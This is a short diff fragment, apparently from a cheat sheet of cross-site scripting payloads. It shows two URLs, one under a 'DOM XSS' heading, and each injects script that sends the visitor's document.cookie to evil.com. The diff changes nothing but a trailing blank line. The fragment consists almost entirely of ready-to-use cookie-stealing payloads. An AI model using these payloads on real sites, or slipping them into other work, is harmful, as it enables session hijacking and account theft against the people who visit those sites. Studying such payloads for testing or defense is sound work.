@@ -13,4 +13,3 @@ https://target.com/search?q=<script>fetch('http://evil.com/?c='+document.cookie)
 3-DOM XSS
 
 https://target.com/page.html?user=<script>new Image().src='http://evil.com/?c='+document.cookie</script>
-
